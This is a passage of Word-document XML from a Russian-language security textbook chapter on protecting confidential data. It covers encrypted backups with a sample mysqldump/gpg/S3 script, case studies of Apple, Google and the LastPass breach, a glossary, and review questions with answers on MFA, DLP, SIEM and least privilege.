      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оригинал: данные на сервере в офисе</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Backup 1: копия на внешнем жёстком диске (в офисе)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Backup 2: копия в облаке (AWS S3, Google Cloud Storage) — **зашифрованная**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шифрование backup</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: Хакер украл резервные копии → если они не зашифрованы, он получил все данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 2022 году </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>LastPass</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (менеджер паролей) был взломан. Хакеры украли:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Исходный код</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Зашифрованные хранилища паролей клиентов** (backup из облачного хранилища)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему это плохо?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Хранилища зашифрованы мастер-паролем пользователя. Если пользователь использовал слабый мастер-пароль (`qwerty123`) → хакер может подобрать его и расшифровать все пароли.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Backup нужно шифровать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>отдельным ключом</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, который хранится </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не в том же месте</w:t>
      </w:r>
      <w:r>
        <w:t>, где backup.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример настройки зашифрованного backup (Linux → AWS S3)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Создать backup БД</w:t>
        <w:br/>
        <w:t>mysqldump -u root -p mydb &gt; /tmp/mydb.sql</w:t>
        <w:br/>
        <w:t># Зашифровать (GPG с паролем)</w:t>
        <w:br/>
        <w:t>gpg --symmetric --cipher-algo AES256 /tmp/mydb.sql</w:t>
        <w:br/>
        <w:t># Загрузить в S3</w:t>
        <w:br/>
        <w:t>aws s3 cp /tmp/mydb.sql.gpg s3://my-backup-bucket/mydb-2025-01-14.sql.gpg</w:t>
        <w:br/>
        <w:t># Удалить локальную копию</w:t>
        <w:br/>
        <w:t>rm /tmp/mydb.sql /tmp/mydb.sql.gpg</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь даже если хакер получит доступ к S3 → без пароля для GPG он не расшифрует backup.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.4.9. Реальные примеры защиты конфиденциальности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Apple: End-to-End шифрование в iCloud</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что сделали:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В 2022 году Apple внедрила **Advanced Data Protection** для iCloud:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фото, заметки, резервные копии iPhone шифруются **end-to-end**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ключ хранится **только на устройствах пользователя**, Apple не имеет доступа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Даже если Apple получит судебный запрос от правительства → не сможет расшифровать данные</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минус</w:t>
      </w:r>
      <w:r>
        <w:t>: Если потерял все устройства Apple + забыл пароль → данные потеряны навсегда.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Google: Advanced Protection Program</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Программа защиты для журналистов, политиков, активистов (тех, кого особенно хотят взломать).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Меры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обязательная **аппаратная MFA** (YubiKey) — нельзя войти без USB-ключа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Блокировка сторонних приложений (можно использовать только официальные приложения Google)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Усиленная проверка подозрительных входов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат</w:t>
      </w:r>
      <w:r>
        <w:t>: За 5 лет ни один участник программы не был взломан.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример провала: LastPass (2022)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что произошло:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакеры взломали ноутбук **одного из инженеров** (через вредоносное ПО)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Получили доступ к **корпоративному хранилищу** (AWS S3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Украли:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Исходный код</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Зашифрованные резервные копии хранилищ паролей клиентов**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Backup не имел **дополнительного шифрования** (кроме мастер-пароля пользователя)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Многие пользователи использовали **слабые мастер-пароли** → хакеры смогли их подобрать</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Урок:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Backup нужно шифровать **отдельным ключом** (не тем же, что основные данные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Инженеры должны использовать **отдельные устройства** для работы (не личные ноутбуки)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**MFA для всех сотрудников** (особенно тех, у кого доступ к критическим системам)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Термин | Определение |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Data at Rest</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Данные, которые </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>хранятся</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на диске, в БД, в облаке |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Data in Transit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Данные, которые </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>передаются</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> по сети |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Data in Use</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Данные, которые </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>обрабатываются</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в оперативной памяти |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>FDE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Full Disk Encryption) | Шифрование всего диска (BitLocker, LUKS, FileVault) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TDE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Transparent Data Encryption) | Автоматическое шифрование данных в БД |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MFA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Multi-Factor Authentication) | Многофакторная аутентификация (пароль + код + биометрия) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TOTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Time-based One-Time Password (коды в Google Authenticator) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RBAC</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Role-Based Access Control (права доступа по ролям) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Least Privilege</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Принцип наименьших привилегий (минимально необходимые права) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DLP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Data Loss Prevention (предотвращение утечек данных) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SIEM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Security Information and Event Management (анализ логов) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Forensics</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Расследование инцидентов после факта |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NDA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Non-Disclosure Agreement (договор о неразглашении) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Clean Desk Policy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Политика чистого стола (не оставлять документы) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Backup 3-2-1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 3 копии, 2 типа носителей, 1 offsite |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Теория</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое "Data at Rest", "Data in Transit", "Data in Use"? Приведите примеры шифрования для каждого типа.**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;summary&gt;Ответ&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Data at Rest**: хранящиеся данные (на диске, в БД) → шифрование: BitLocker (диск), TDE (БД)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Data in Transit**: передающиеся данные (по сети) → шифрование: HTTPS (TLS), VPN, SSH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Data in Use**: обрабатываемые данные (в RAM) → шифрование: Intel SGX, AMD SEV</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое MFA (многофакторная аутентификация)? Назовите три типа факторов. Почему SMS-коды считаются менее безопасными, чем TOTP?**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;summary&gt;Ответ&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MFA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — для входа требуется 2+ фактора:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Что ты знаешь (пароль, PIN)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Что у тебя есть (смартфон, YubiKey)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Кто ты (биометрия: отпечаток, Face ID)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SMS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> менее безопасен, чем </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TOTP</w:t>
      </w:r>
      <w:r>
        <w:t>, потому что:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SMS можно перехватить (SIM-swapping: хакер переводит твой номер на свою SIM-карту)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TOTP генерируется локально на устройстве, не передаётся по сети</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое DLP (Data Loss Prevention)? Назовите три типа DLP. Приведите пример, когда DLP блокирует утечку.**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;summary&gt;Ответ&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DLP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — система предотвращения утечек конфиденциальных данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Network DLP**: мониторит трафик (email, веб) → блокирует отправку конфиденциальных данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Endpoint DLP**: блокирует копирование на USB, печать</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Cloud DLP**: блокирует загрузку конфиденциальных данных в публичные облака</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Сотрудник пытается отправить файл `clients.xlsx` на личный Gmail → DLP обнаруживает номера телефонов/email → блокирует отправку + логирует попытку.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое SIEM? Как он помогает обнаружить атаку? Приведите пример алерта.**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;summary&gt;Ответ&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SIEM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Security Information and Event Management) — система сбора и анализа логов из всех источников (серверы, файрволы, приложения).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как помогает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Собирает логи → нормализует → ищет паттерны → генерирует алерты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример алерта:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Правило: 10 неудачных попыток входа за минуту с одного IP → алерт "Возможная brute force атака" → администратор блокирует IP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое принцип наименьших привилегий (Least Privilege)? Приведите пример, как его нарушение привело к инциденту.**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;summary&gt;Ответ&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Least Privilege</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: каждый пользователь/процесс должен иметь </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>минимально необходимые права</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример нарушения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Colonial Pipeline (2021)**: ransomware зашифровал серверы. Почему? Учётная запись, через которую зашли хакеры, имела **права администратора**. Если бы права были ограничены → ransomware не смог бы зашифровать критические системы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Практические задачи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача**: Компания хочет защитить конфиденциальные данные клиентов (150 ГБ). Предложите комплексное решение (шифрование, контроль доступа, backup).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;summary&gt;Решение&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифрование**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Data at Rest**: TDE для БД (AES-256)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Data in Transit**: HTTPS (TLS 1.3) для веб-приложения, VPN для удалённых сотрудников</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Data in Use**: если критично → Intel SGX</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Контроль доступа**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>RBAC: роль "Аналитик данных" — только чтение, роль "Администратор БД" — полный доступ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MFA для всех сотрудников (TOTP или YubiKey)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Принцип Least Privilege: разработчики видят только тестовые данные, не продакшн</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**DLP**:</w:t>
